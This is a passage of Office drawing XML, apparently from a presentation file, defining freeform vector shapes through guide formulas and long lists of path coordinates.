                    <a:pt x="95" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="153"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="64" y="95"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="64" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="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2" name="Freeform 83">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7800DC5-6BAE-4A84-9442-2A3B5F982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7346" y="4770827"/>
              <a:ext cx="79316" cy="69576"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 55 w 171"/>
                <a:gd name="T1" fmla="*/ 27 h 150"/>
                <a:gd name="T2" fmla="*/ 76 w 171"/>
                <a:gd name="T3" fmla="*/ 6 h 150"/>
                <a:gd name="T4" fmla="*/ 105 w 171"/>
                <a:gd name="T5" fmla="*/ 0 h 150"/>
                <a:gd name="T6" fmla="*/ 119 w 171"/>
                <a:gd name="T7" fmla="*/ 0 h 150"/>
                <a:gd name="T8" fmla="*/ 136 w 171"/>
                <a:gd name="T9" fmla="*/ 10 h 150"/>
                <a:gd name="T10" fmla="*/ 144 w 171"/>
                <a:gd name="T11" fmla="*/ 18 h 150"/>
                <a:gd name="T12" fmla="*/ 148 w 171"/>
                <a:gd name="T13" fmla="*/ 33 h 150"/>
                <a:gd name="T14" fmla="*/ 150 w 171"/>
                <a:gd name="T15" fmla="*/ 115 h 150"/>
                <a:gd name="T16" fmla="*/ 152 w 171"/>
                <a:gd name="T17" fmla="*/ 130 h 150"/>
                <a:gd name="T18" fmla="*/ 156 w 171"/>
                <a:gd name="T19" fmla="*/ 140 h 150"/>
                <a:gd name="T20" fmla="*/ 171 w 171"/>
                <a:gd name="T21" fmla="*/ 142 h 150"/>
                <a:gd name="T22" fmla="*/ 96 w 171"/>
                <a:gd name="T23" fmla="*/ 150 h 150"/>
                <a:gd name="T24" fmla="*/ 96 w 171"/>
                <a:gd name="T25" fmla="*/ 142 h 150"/>
                <a:gd name="T26" fmla="*/ 111 w 171"/>
                <a:gd name="T27" fmla="*/ 140 h 150"/>
                <a:gd name="T28" fmla="*/ 115 w 171"/>
                <a:gd name="T29" fmla="*/ 130 h 150"/>
                <a:gd name="T30" fmla="*/ 117 w 171"/>
                <a:gd name="T31" fmla="*/ 55 h 150"/>
                <a:gd name="T32" fmla="*/ 115 w 171"/>
                <a:gd name="T33" fmla="*/ 35 h 150"/>
                <a:gd name="T34" fmla="*/ 111 w 171"/>
                <a:gd name="T35" fmla="*/ 22 h 150"/>
                <a:gd name="T36" fmla="*/ 103 w 171"/>
                <a:gd name="T37" fmla="*/ 14 h 150"/>
                <a:gd name="T38" fmla="*/ 92 w 171"/>
                <a:gd name="T39" fmla="*/ 12 h 150"/>
                <a:gd name="T40" fmla="*/ 84 w 171"/>
                <a:gd name="T41" fmla="*/ 12 h 150"/>
                <a:gd name="T42" fmla="*/ 68 w 171"/>
                <a:gd name="T43" fmla="*/ 22 h 150"/>
                <a:gd name="T44" fmla="*/ 63 w 171"/>
                <a:gd name="T45" fmla="*/ 29 h 150"/>
                <a:gd name="T46" fmla="*/ 55 w 171"/>
                <a:gd name="T47" fmla="*/ 58 h 150"/>
                <a:gd name="T48" fmla="*/ 55 w 171"/>
                <a:gd name="T49" fmla="*/ 115 h 150"/>
                <a:gd name="T50" fmla="*/ 59 w 171"/>
                <a:gd name="T51" fmla="*/ 138 h 150"/>
                <a:gd name="T52" fmla="*/ 64 w 171"/>
                <a:gd name="T53" fmla="*/ 142 h 150"/>
                <a:gd name="T54" fmla="*/ 76 w 171"/>
                <a:gd name="T55" fmla="*/ 150 h 150"/>
                <a:gd name="T56" fmla="*/ 0 w 171"/>
                <a:gd name="T57" fmla="*/ 142 h 150"/>
                <a:gd name="T58" fmla="*/ 12 w 171"/>
                <a:gd name="T59" fmla="*/ 142 h 150"/>
                <a:gd name="T60" fmla="*/ 18 w 171"/>
                <a:gd name="T61" fmla="*/ 138 h 150"/>
                <a:gd name="T62" fmla="*/ 22 w 171"/>
                <a:gd name="T63" fmla="*/ 115 h 150"/>
                <a:gd name="T64" fmla="*/ 22 w 171"/>
                <a:gd name="T65" fmla="*/ 37 h 150"/>
                <a:gd name="T66" fmla="*/ 18 w 171"/>
                <a:gd name="T67" fmla="*/ 16 h 150"/>
                <a:gd name="T68" fmla="*/ 12 w 171"/>
                <a:gd name="T69" fmla="*/ 12 h 150"/>
                <a:gd name="T70" fmla="*/ 0 w 171"/>
                <a:gd name="T71" fmla="*/ 4 h 150"/>
                <a:gd name="T72" fmla="*/ 55 w 171"/>
                <a:gd name="T73" fmla="*/ 2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71" h="150">
                  <a:moveTo>
                    <a:pt x="55" y="27"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="55" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="146" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="150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12" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55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3" name="Freeform 84">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D455C4C-00C2-42CB-A32B-503DFC6308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21300" y="4743924"/>
              <a:ext cx="71895" cy="96478"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 124 w 155"/>
                <a:gd name="T1" fmla="*/ 173 h 208"/>
                <a:gd name="T2" fmla="*/ 124 w 155"/>
                <a:gd name="T3" fmla="*/ 173 h 208"/>
                <a:gd name="T4" fmla="*/ 126 w 155"/>
                <a:gd name="T5" fmla="*/ 186 h 208"/>
                <a:gd name="T6" fmla="*/ 126 w 155"/>
                <a:gd name="T7" fmla="*/ 190 h 208"/>
                <a:gd name="T8" fmla="*/ 128 w 155"/>
                <a:gd name="T9" fmla="*/ 194 h 208"/>
                <a:gd name="T10" fmla="*/ 132 w 155"/>
                <a:gd name="T11" fmla="*/ 196 h 208"/>
                <a:gd name="T12" fmla="*/ 136 w 155"/>
                <a:gd name="T13" fmla="*/ 198 h 208"/>
                <a:gd name="T14" fmla="*/ 149 w 155"/>
                <a:gd name="T15" fmla="*/ 200 h 208"/>
                <a:gd name="T16" fmla="*/ 149 w 155"/>
                <a:gd name="T17" fmla="*/ 208 h 208"/>
                <a:gd name="T18" fmla="*/ 66 w 155"/>
                <a:gd name="T19" fmla="*/ 208 h 208"/>
                <a:gd name="T20" fmla="*/ 66 w 155"/>
                <a:gd name="T21" fmla="*/ 200 h 208"/>
                <a:gd name="T22" fmla="*/ 66 w 155"/>
                <a:gd name="T23" fmla="*/ 200 h 208"/>
                <a:gd name="T24" fmla="*/ 79 w 155"/>
                <a:gd name="T25" fmla="*/ 198 h 208"/>
                <a:gd name="T26" fmla="*/ 85 w 155"/>
                <a:gd name="T27" fmla="*/ 196 h 208"/>
                <a:gd name="T28" fmla="*/ 85 w 155"/>
                <a:gd name="T29" fmla="*/ 196 h 208"/>
                <a:gd name="T30" fmla="*/ 87 w 155"/>
                <a:gd name="T31" fmla="*/ 192 h 208"/>
                <a:gd name="T32" fmla="*/ 89 w 155"/>
                <a:gd name="T33" fmla="*/ 188 h 208"/>
                <a:gd name="T34" fmla="*/ 91 w 155"/>
                <a:gd name="T35" fmla="*/ 173 h 208"/>
                <a:gd name="T36" fmla="*/ 91 w 155"/>
                <a:gd name="T37" fmla="*/ 151 h 208"/>
                <a:gd name="T38" fmla="*/ 0 w 155"/>
                <a:gd name="T39" fmla="*/ 151 h 208"/>
                <a:gd name="T40" fmla="*/ 0 w 155"/>
                <a:gd name="T41" fmla="*/ 140 h 208"/>
                <a:gd name="T42" fmla="*/ 99 w 155"/>
                <a:gd name="T43" fmla="*/ 0 h 208"/>
                <a:gd name="T44" fmla="*/ 124 w 155"/>
                <a:gd name="T45" fmla="*/ 0 h 208"/>
                <a:gd name="T46" fmla="*/ 124 w 155"/>
                <a:gd name="T47" fmla="*/ 140 h 208"/>
                <a:gd name="T48" fmla="*/ 155 w 155"/>
                <a:gd name="T49" fmla="*/ 140 h 208"/>
                <a:gd name="T50" fmla="*/ 155 w 155"/>
                <a:gd name="T51" fmla="*/ 151 h 208"/>
                <a:gd name="T52" fmla="*/ 124 w 155"/>
                <a:gd name="T53" fmla="*/ 151 h 208"/>
                <a:gd name="T54" fmla="*/ 124 w 155"/>
                <a:gd name="T55" fmla="*/ 173 h 208"/>
                <a:gd name="T56" fmla="*/ 91 w 155"/>
                <a:gd name="T57" fmla="*/ 29 h 208"/>
                <a:gd name="T58" fmla="*/ 14 w 155"/>
                <a:gd name="T59" fmla="*/ 140 h 208"/>
                <a:gd name="T60" fmla="*/ 91 w 155"/>
                <a:gd name="T61" fmla="*/ 140 h 208"/>
                <a:gd name="T62" fmla="*/ 91 w 155"/>
                <a:gd name="T63" fmla="*/ 29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5" h="208">
                  <a:moveTo>
                    <a:pt x="124" y="173"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="124" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="126" y="186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="126" y="190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128" y="194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="173"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="91" y="29"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91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4" name="Freeform 85">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29A0792F-4ADE-49FD-A6B1-D51EC9AE1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1543" y="4770827"/>
              <a:ext cx="76533" cy="70967"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 112 w 165"/>
                <a:gd name="T1" fmla="*/ 152 h 153"/>
                <a:gd name="T2" fmla="*/ 112 w 165"/>
                <a:gd name="T3" fmla="*/ 122 h 153"/>
                <a:gd name="T4" fmla="*/ 89 w 165"/>
                <a:gd name="T5" fmla="*/ 146 h 153"/>
                <a:gd name="T6" fmla="*/ 60 w 165"/>
                <a:gd name="T7" fmla="*/ 153 h 153"/>
                <a:gd name="T8" fmla="*/ 48 w 165"/>
                <a:gd name="T9" fmla="*/ 152 h 153"/>
                <a:gd name="T10" fmla="*/ 31 w 165"/>
                <a:gd name="T11" fmla="*/ 142 h 153"/>
                <a:gd name="T12" fmla="*/ 25 w 165"/>
                <a:gd name="T13" fmla="*/ 132 h 153"/>
                <a:gd name="T14" fmla="*/ 19 w 165"/>
                <a:gd name="T15" fmla="*/ 97 h 153"/>
                <a:gd name="T16" fmla="*/ 19 w 165"/>
                <a:gd name="T17" fmla="*/ 37 h 153"/>
                <a:gd name="T18" fmla="*/ 19 w 165"/>
                <a:gd name="T19" fmla="*/ 35 h 153"/>
                <a:gd name="T20" fmla="*/ 19 w 165"/>
                <a:gd name="T21" fmla="*/ 22 h 153"/>
                <a:gd name="T22" fmla="*/ 17 w 165"/>
                <a:gd name="T23" fmla="*/ 14 h 153"/>
                <a:gd name="T24" fmla="*/ 11 w 165"/>
                <a:gd name="T25" fmla="*/ 12 h 153"/>
                <a:gd name="T26" fmla="*/ 0 w 165"/>
                <a:gd name="T27" fmla="*/ 4 h 153"/>
                <a:gd name="T28" fmla="*/ 56 w 165"/>
                <a:gd name="T29" fmla="*/ 0 h 153"/>
                <a:gd name="T30" fmla="*/ 52 w 165"/>
                <a:gd name="T31" fmla="*/ 86 h 153"/>
                <a:gd name="T32" fmla="*/ 52 w 165"/>
                <a:gd name="T33" fmla="*/ 89 h 153"/>
                <a:gd name="T34" fmla="*/ 54 w 165"/>
                <a:gd name="T35" fmla="*/ 111 h 153"/>
                <a:gd name="T36" fmla="*/ 56 w 165"/>
                <a:gd name="T37" fmla="*/ 124 h 153"/>
                <a:gd name="T38" fmla="*/ 64 w 165"/>
                <a:gd name="T39" fmla="*/ 134 h 153"/>
                <a:gd name="T40" fmla="*/ 75 w 165"/>
                <a:gd name="T41" fmla="*/ 138 h 153"/>
                <a:gd name="T42" fmla="*/ 85 w 165"/>
                <a:gd name="T43" fmla="*/ 136 h 153"/>
                <a:gd name="T44" fmla="*/ 101 w 165"/>
                <a:gd name="T45" fmla="*/ 124 h 153"/>
                <a:gd name="T46" fmla="*/ 106 w 165"/>
                <a:gd name="T47" fmla="*/ 115 h 153"/>
                <a:gd name="T48" fmla="*/ 112 w 165"/>
                <a:gd name="T49" fmla="*/ 82 h 153"/>
                <a:gd name="T50" fmla="*/ 112 w 165"/>
                <a:gd name="T51" fmla="*/ 37 h 153"/>
                <a:gd name="T52" fmla="*/ 108 w 165"/>
                <a:gd name="T53" fmla="*/ 16 h 153"/>
                <a:gd name="T54" fmla="*/ 106 w 165"/>
                <a:gd name="T55" fmla="*/ 14 h 153"/>
                <a:gd name="T56" fmla="*/ 91 w 165"/>
                <a:gd name="T57" fmla="*/ 10 h 153"/>
                <a:gd name="T58" fmla="*/ 147 w 165"/>
                <a:gd name="T59" fmla="*/ 0 h 153"/>
                <a:gd name="T60" fmla="*/ 145 w 165"/>
                <a:gd name="T61" fmla="*/ 56 h 153"/>
                <a:gd name="T62" fmla="*/ 145 w 165"/>
                <a:gd name="T63" fmla="*/ 115 h 153"/>
                <a:gd name="T64" fmla="*/ 149 w 165"/>
                <a:gd name="T65" fmla="*/ 138 h 153"/>
                <a:gd name="T66" fmla="*/ 155 w 165"/>
                <a:gd name="T67" fmla="*/ 142 h 153"/>
                <a:gd name="T68" fmla="*/ 165 w 165"/>
                <a:gd name="T69" fmla="*/ 15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65" h="153">
                  <a:moveTo>
                    <a:pt x="112" y="152"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="112" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="93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19" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4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54" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="106" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="106" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="106" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="106" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="151" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="1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5" name="Freeform 86">
              <a:extLst>
